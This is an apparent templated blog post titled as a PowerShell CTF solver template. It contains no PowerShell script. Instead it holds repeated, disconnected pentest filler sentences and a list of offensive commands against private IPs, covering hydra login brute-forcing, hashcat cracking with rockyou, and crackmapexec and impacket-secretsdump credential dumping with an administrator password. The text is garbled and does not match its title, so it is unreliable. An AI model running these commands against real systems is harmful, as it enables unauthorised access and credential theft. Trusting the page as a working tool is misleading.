---
TitleSEO: "CTF Challenge Solver Template in PowerShell | ZureFX"
TitlePost: "CTF Challenge Solver Template — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for ctf challenge solver template. Built for security research and automation."
Keywords: "powershell, automation, tool"
URL: "https://zurefx.github.io/scripting/script-ctf-challenge-solver-template-615.html"
URL_IMAGES: ""
Date: "2024-03-23"
Tags: "PowerShell, Automation, Tool"
Section: "scripting"
Lang: "en"
main_img: "script-ctf-challenge-solver-template-615"
Permalink: "/scripting/script-ctf-challenge-solver-template-615.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Lateral movement was facilitated by reusing discovered credentials across services. Lateral movement was facilitated by reusing discovered credentials across services. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `hydra`
- `lookupsid`
- `nikto`

## Implementation

### Core Logic

The service was running without proper input validation, leading to injection vulnerabilities. Token impersonation allowed elevation to SYSTEM privileges on the target.

```powershell
feroxbuster -h
```

Lateral movement was facilitated by reusing discovered credentials across services. Initial enumeration revealed several interesting open ports on the target.

### Helper Functions

The web application was vulnerable to Server-Side Template Injection (SSTI). Authentication bypass was achieved through careful manipulation of the login mechanism.

```powershell
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.81.42.251 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.100.143.28 -u administrator -p 'P@ssw0rd!' --shares
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
nmap -sCV -p8888,5986,53 10.90.151.213 -oN scan.txt
```

### Advanced Options

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

```bash
gobuster dir -u http://10.30.112.174/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.127.236.253/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.34.232.3
```

## Output

### Example Output

The database credentials were hardcoded in the application source code. Privilege escalation was possible due to misconfigured sudo permissions.

```
[+] Scanning target...
[+] Found 20 results
[+] Done in 25.66s
```
